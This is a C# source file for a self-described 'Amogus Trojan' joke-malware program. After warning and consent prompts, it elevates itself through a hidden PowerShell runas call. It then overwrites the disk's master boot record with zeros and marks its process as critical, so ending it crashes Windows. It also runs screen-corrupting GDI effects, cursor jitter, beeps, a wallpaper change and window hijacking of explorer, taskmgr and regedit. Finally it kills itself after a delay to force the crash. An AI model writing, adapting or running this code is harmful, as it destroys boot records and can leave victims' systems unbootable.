using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Numerics;
using System.Threading;
using System.Windows.Forms;
using Zigman.Engine;

namespace Zigman.Amogus
{
    public static class Program
    {
        public static void Main(string[] args)
        {
            var sfxAmogus = new SoundPlayer(Path.Combine(Directory.GetCurrentDirectory(), "assets/sfx_amogus.wav"));
            Console.Title = "Amogus Trojan | Made by TheAirBlow";
            Console.WriteLine("/------------------------------------\\");
            Console.WriteLine("| Amogus Trojan | Made by TheAirBlow |");
            Console.WriteLine("|      Powered by Zigman Engine      |");
            Console.WriteLine("\\------------------------------------/");
            Console.WriteLine();
            Console.WriteLine("You are about to run a trojan, made only for the purposes of entertainment and education.");
            Console.WriteLine("There are a lot of flashing lights, which may cause photosensitive epilepsy.");
            Console.WriteLine("You can select to run only safe payloads, or destroy your system.");
            Console.WriteLine("I am not responsible for any damages.");
            if (!Imports.IsAdministrator()) {
                Console.WriteLine("Administrator priveleges are required!");
                Console.WriteLine("Press \"Yes\" in the UAC promt.");
            }
            Console.WriteLine("Press Enter to continue.");
            sfxAmogus.Play();
            Console.ReadLine();
            sfxAmogus.Play();

            // Elevation
            if (!Imports.IsAdministrator()) {
                var proc = new Process();
                proc.StartInfo.FileName = "powershell.exe";
                proc.StartInfo.UseShellExecute = true;
                proc.StartInfo.Arguments = $"-Command Start-Process \"{Application.ExecutablePath}\" -Verb runas";
                proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                proc.Start();
                sfxAmogus.Play();
                proc.WaitForExit();
                Environment.Exit(0);
            }
            
            // Check for windows versions
            if (Environment.OSVersion.Platform != PlatformID.Win32NT)
                throw new Exception("This is Windows-only!");
            
            if (Environment.OSVersion.Version.Major < 6 &&
                Environment.OSVersion.Version.Minor < 1)
                throw new Exception("Windows 7 is required!");
            
            Console.WriteLine("Do you want to fuck up MBR and Windows?");
            Console.WriteLine("Process will also become unkillable.");
            Console.WriteLine("Type anything to exit.");
            Console.WriteLine("Type y, if you agree.");
            Console.WriteLine("Type n, if you don't.");
            Console.Write("[y/n] > ");
            var ch = Console.ReadKey().KeyChar;
            Console.WriteLine();
            switch (ch)
            {
                case 'y' or 'Y':
                    sfxAmogus.Play();
                    Console.WriteLine("Please type in \"I agree\" (case-sensitive)");
                    Console.Write("[I agree] > ");
                    var text = Console.ReadLine();
                    if (text != "I agree") {
                        sfxAmogus.Play();
                        Console.WriteLine("Invalid answer!");
                        Console.WriteLine("Неправильный ответ!");
                        Thread.Sleep(2000);
                        return;
                    }
                    sfxAmogus.Play();
                    MbrOverwrite.Overwrite(new byte[512]);
                    Imports.MakeProcessCritical();
                    break;
                case 'n' or 'N':
                    sfxAmogus.Play();
                    break;
                default:
                    sfxAmogus.Play();
                    Console.WriteLine("Invalid answer!");
                    Console.WriteLine("Неправильный ответ!");
                    Thread.Sleep(2000);
                    return;
            }
            
            // We don't wanna sacrifice performance of the payloads,
            // we'll sacrifice the CPU usage instead
            PayloadManager.Initialize(14);

            Imports.ShowWindow(Imports.GetConsoleWindow(), 0);
            Console.CancelKeyPress += (_, _) => {
                Console.WriteLine($"[Program] SIGINT received, exiting...");
                Process.GetCurrentProcess().Kill();
            };
            
            AppDomain.CurrentDomain.ProcessExit += (_, _) => {
                Console.WriteLine($"[Program] SIGTERM received, exiting...");
                Process.GetCurrentProcess().Kill(); 
            };

            var path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "note.txt");
            File.WriteAllText(path, "Haha you just ran Amogus trojan!!1!\nRest in piss, forever miss!\n\nCopyright (C) TheAirBlow 2021");
            Process.Start(@"C:\Windows\System32\notepad.exe", path);

            var current = 0;
            var initialized = false;
            var hdc = Imports.CreateDC();
            var g = Graphics.FromHdc(hdc);
            var amogus = Image.FromFile(Path.Combine(Directory.GetCurrentDirectory(), "assets/img_amogus.png"));
            var monke = Image.FromFile(Path.Combine(Directory.GetCurrentDirectory(), "assets/img_monke.png"));
            
            // We want only one of them to work at the same time
            var currentRotationPayload = 1;
            
            // Rotate everything payload
            var rotationIndex1 = 1;
            var lastRotationIndex1 = 0;
            
            // What the fuck? payload #1
            var rotationIndex2 = 0;
            
            // What the fuck? payload #2
            var rotationIndex3 = 0;
            var lastRotationIndex3 = 0;
            
            // Rotation values
            var rotationValues = new List<Rectangle> {
                //----------------------------------------\\
                new(0, 0, Imports.Width, Imports.Height),
                new(0, 5, Imports.Width, Imports.Height),
                new(0, 10, Imports.Width, Imports.Height),
                new(0, 15, Imports.Width, Imports.Height),
                new(0, 20, Imports.Width, Imports.Height),
                new(0, 25, Imports.Width, Imports.Height),
                new(0, 30, Imports.Width, Imports.Height),
                new(0, 35, Imports.Width, Imports.Height),
                new(0, 40, Imports.Width, Imports.Height),
                new(0, 45, Imports.Width, Imports.Height),
                new(0, 50, Imports.Width, Imports.Height),
                new(0, 55, Imports.Width, Imports.Height),
                new(0, 60, Imports.Width, Imports.Height),
                //-----------------------------------------\\
                new(5, 60, Imports.Width, Imports.Height),
                new(10, 60, Imports.Width, Imports.Height),
                new(15, 60, Imports.Width, Imports.Height),
                new(20, 60, Imports.Width, Imports.Height),
                new(25, 60, Imports.Width, Imports.Height),
                new(30, 60, Imports.Width, Imports.Height),
                new(35, 60, Imports.Width, Imports.Height),
                new(40, 60, Imports.Width, Imports.Height),
                //------------------------------------------\\
                new(40, 55, Imports.Width, Imports.Height),
                new(40, 50, Imports.Width, Imports.Height),
                new(40, 45, Imports.Width, Imports.Height),
                new(40, 40, Imports.Width, Imports.Height),
                new(40, 35, Imports.Width, Imports.Height),
                new(40, 30, Imports.Width, Imports.Height),
                new(40, 25, Imports.Width, Imports.Height),
                new(40, 20, Imports.Width, Imports.Height),
                new(40, 15, Imports.Width, Imports.Height),
                new(40, 10, Imports.Width, Imports.Height),
                new(40, 5, Imports.Width, Imports.Height),
                //-----------------------------------------\\
                new(40, 0, Imports.Width, Imports.Height),
                new(35, 0, Imports.Width, Imports.Height),
                new(30, 0, Imports.Width, Imports.Height),
                new(25, 0, Imports.Width, Imports.Height),
                new(20, 0, Imports.Width, Imports.Height),
                new(15, 0, Imports.Width, Imports.Height),
                new(10, 0, Imports.Width, Imports.Height),
                new(5, 0, Imports.Width, Imports.Height),
                new(0, 0, Imports.Width, Imports.Height),
            };

            // Play music
            var player = new SoundPlayer(Path.Combine(Directory.GetCurrentDirectory(), "assets/music_amogus.wav"));
            player.PlayLooping();
            
            // Change wallpaper
            Wallpaper.Set(Path.Combine(Directory.GetCurrentDirectory(), 
                "assets/img_wallpaper.jpg"), Wallpaper.Style.Stretched);
            
            Thread.Sleep(4000);
            
            var queue = new PayloadQueue(PayloadManager.AddAction, new List<Action> {
                () => {
                    // Draw amogus and monke
                    var x = GlobalRandom.Random.Next(0, Imports.Width);
                    var y = GlobalRandom.Random.Next(0, Imports.Height);
                    lock (monke) lock (amogus) {
                        if (GlobalRandom.Random.Next(0, 100) < 8) {
                            g.DrawImage(monke, x, y);
                            // Play "sfx_pablo.wav"
                        } else {
                            g.DrawImage(amogus, x, y);
                            // Play "sfx_amogus.wav"
                        }
                    }
                }, () => {
                    // Draw icons everywhere
                    var icon = Imports.LoadIcon(IntPtr.Zero, GlobalRandom.Random.Next(32512, 32518)); 
                    Imports.DrawIcon(hdc, GlobalRandom.Random.Next(0, Imports.Width), GlobalRandom.Random.Next(0, Imports.Height), icon);
                }, () => {
                    // Copy random chunks into random positions and invert them
                    var x1 = GlobalRandom.Random.Next(0, Imports.Width);
                    var y1 = GlobalRandom.Random.Next(0, Imports.Height);
                    var x2 = GlobalRandom.Random.Next(0, Imports.Width);
                    var y2 = GlobalRandom.Random.Next(0, Imports.Height);
                    var w = GlobalRandom.Random.Next(0, 300);
                    var h = GlobalRandom.Random.Next(0, 300);
                    var w2 = GlobalRandom.Random.Next(0, Imports.Width);
                    var h2 = GlobalRandom.Random.Next(0, Imports.Height);
                    Imports.StretchBlt(hdc, x1, y1, w, h, hdc, x2, y2, w2, 
                        h2, Imports.RasterOperation.SrcInvert);
                }, () => {
                    // Move cursor randomly
                    Cursor.Position = new Point(Cursor.Position.X + GlobalRandom.Random.Next(-10, 10),
                        Cursor.Position.Y + GlobalRandom.Random.Next(-10, 10));
                    Thread.Sleep(20);
                }, () => {
                    // Reverse the screen
                    Imports.StretchBlt(
                        hdc, 0, 0, 
                        Imports.Width, Imports.Height, 
                        hdc, Imports.Width, 0,
                        -Imports.Width, Imports.Height,
                        Imports.RasterOperation.SrcCopy);
                    Thread.Sleep(100);
                }, () => {
                    // Invert random chunks (same width and height) 
                    var x = GlobalRandom.Random.Next(0, Imports.Width);
                    var y = GlobalRandom.Random.Next(0, Imports.Height);
                    var wh = GlobalRandom.Random.Next(0, 300);
                    Imports.StretchBlt(hdc, x, y, wh, wh, hdc, x, y, wh, 
                        wh, Imports.RasterOperation.DstInvert);
                }, () => {
                    // Invert screen
                    Imports.StretchBlt(hdc, 0, 0, Imports.Width, Imports.Height, 
                        hdc, 0, 0, Imports.Width, Imports.Height, Imports.RasterOperation.DstInvert);
                    Thread.Sleep(100);
                }, () => {
                    // Recursive
                    var w = Imports.Width - 100;
                    var h = Imports.Height - 100;
                    Imports.StretchBlt(hdc, 50, 50, w, h, hdc, 
                        0, 0, Imports.Width, Imports.Height, Imports.RasterOperation.SrcCopy);
                }, () => {
                    // Play random beeps
                    Imports.Beep(GlobalRandom.Random.Next(500, 1500), 100);
                }, () => {
                    // Screen melter
                    var x = GlobalRandom.Random.Next(0, Imports.Width);
                    var y = GlobalRandom.Random.Next(5, 50);
                    var size = GlobalRandom.Random.Next(2, 100);
                    Imports.StretchBlt(hdc, x, y, 
                        size, Imports.Height, hdc, x,
                        0, size, Imports.Height,
                        Imports.RasterOperation.SrcCopy);
                }, () => {
                    // Rotation
                    if (currentRotationPayload != 1) Thread.Sleep(1000);
                    if (rotationIndex1 == rotationValues.Count - 1)
                        rotationIndex1 = 0;
                    var lastRotation = rotationValues[lastRotationIndex1];
                    var newRotation = rotationValues[rotationIndex1];
                    Imports.StretchBlt(hdc, newRotation.X, newRotation.Y, newRotation.Width, newRotation.Height,
                        hdc, lastRotation.X, lastRotation.Y, lastRotation.Width, lastRotation.Height,
                        Imports.RasterOperation.SrcCopy);

                    rotationIndex1++;
                }, () => {
                    // What the fuck? #1
                    if (currentRotationPayload == 1) currentRotationPayload = 2;
                    if (currentRotationPayload != 2) Thread.Sleep(1000);
                    if (rotationIndex2 == rotationValues.Count - 1)
                        rotationIndex2 = 0;
                    var lastRotation = new Rectangle(0, 0, Imports.Width, Imports.Height);
                    var newRotation = rotationValues[rotationIndex2];
                    Imports.StretchBlt(hdc, newRotation.X, newRotation.Y, newRotation.Width, newRotation.Height,
                        hdc, lastRotation.X, lastRotation.Y, lastRotation.Width, lastRotation.Height,
                        Imports.RasterOperation.SrcCopy);

                    Imports.StretchBlt(hdc, -newRotation.X, newRotation.Y, newRotation.Width, newRotation.Height,
                        hdc, -lastRotation.X, lastRotation.Y, lastRotation.Width, lastRotation.Height,
                        Imports.RasterOperation.SrcCopy);
                
                    Imports.StretchBlt(hdc, newRotation.X, -newRotation.Y, newRotation.Width, newRotation.Height,
                        hdc, lastRotation.X, -lastRotation.Y, lastRotation.Width, lastRotation.Height,
                        Imports.RasterOperation.SrcCopy);
                
                    Imports.StretchBlt(hdc, -newRotation.X, -newRotation.Y, newRotation.Width, newRotation.Height,
                        hdc, -lastRotation.X, -lastRotation.Y, lastRotation.Width, lastRotation.Height,
                        Imports.RasterOperation.SrcCopy);
                
                    rotationIndex2++;
                }, () => {
                    // Christmas!
                    if (!initialized) {
                        Imports.MagInitialize();
                        initialized = true;
                    }
                    
                    var matrix = new Imports.ColorEffect {
                        transform = new float[] {
                            1, 0, 0, 0, 0,
                            0, 1, 0, 0, 0,
                            0, 0, 1, 0, 0,
                            0, 0, 0, 1, 0,
                            0, 0, 0, 0, 0
                        }
                    };

                    matrix.transform[19 + current] = 0.4f;
                    Imports.MagSetFullscreenColorEffect(ref matrix);
                    current++;
                    if (current == 4) current = 1;
                    Thread.Sleep(500);
                }, () => {
                    // Move specific processes' windows and subelements, change their text too
                    var processes = new List<string> {
                        "explorer", "notepad",
                        "wordpad", "cmd", "regedit", "taskmgr", "mspaint",
                        "powershell", "calc", "control", "mmc", "winver"
                    };
                    foreach (var hWnd in from name in processes from proc 
                                 in Process.GetProcessesByName(name) select proc.MainWindowHandle) {
                        Imports.EnumChildWindows(hWnd, (hwnd, _) => {
                            Imports.SetWindowTextA(hwnd, "AMOGUS (VERY SUS)");
                            Imports.SetWindowPos(hwnd, (IntPtr)0, GlobalRandom.Random.Next(0, 80), 
                                GlobalRandom.Random.Next(0, 80), 0, 0, (uint)Imports.SetWindowPosFlags.DoNotResize);
                            return true;
                        },  (IntPtr)null);
                        Imports.SetWindowTextA(hWnd, "AMOGUS (VERY SUS)");
                        Imports.SetWindowPos(hWnd, (IntPtr)Imports.ZOrder.Top, GlobalRandom.Random.Next(0, Imports.Width), 
                            GlobalRandom.Random.Next(0, Imports.Height), 0, 0, (uint)Imports.SetWindowPosFlags.DoNotResize);
                    }
                    
                    Thread.Sleep(500);
                }, () => {
                    // What the fuck? #2
                    if (currentRotationPayload == 2) currentRotationPayload = 3;
                    if (rotationIndex3 == rotationValues.Count - 1)
                        rotationIndex3 = 0;
                    var lastRotation = rotationValues[lastRotationIndex3];
                    var newRotation = new Rectangle(0, 0, Imports.Width, Imports.Height);
                    Imports.StretchBlt(hdc, newRotation.X, newRotation.Y, newRotation.Width, newRotation.Height,
                        hdc, lastRotation.X, lastRotation.Y, lastRotation.Width, lastRotation.Height,
                        Imports.RasterOperation.SrcCopy);

                    Imports.StretchBlt(hdc, -newRotation.X, newRotation.Y, newRotation.Width, newRotation.Height,
                        hdc, lastRotation.X, lastRotation.Y, lastRotation.Width, lastRotation.Height,
                        Imports.RasterOperation.SrcCopy);
                
                    Imports.StretchBlt(hdc, newRotation.X, -newRotation.Y, newRotation.Width, newRotation.Height,
                        hdc, lastRotation.X, lastRotation.Y, lastRotation.Width, lastRotation.Height,
                        Imports.RasterOperation.SrcCopy);
                
                    Imports.StretchBlt(hdc, -newRotation.X, -newRotation.Y, newRotation.Width, newRotation.Height,
                        hdc, lastRotation.X, lastRotation.Y, lastRotation.Width, lastRotation.Height,
                        Imports.RasterOperation.SrcCopy);
                
                    lastRotationIndex3 = rotationIndex3;
                    rotationIndex3++;
                }, () => {
                    // Kill Windows after 1 minute
                    Thread.Sleep(40000);
                    Process.GetCurrentProcess().Kill();
                }
            }, 20000);
            
            queue.Start();
        }
    }
}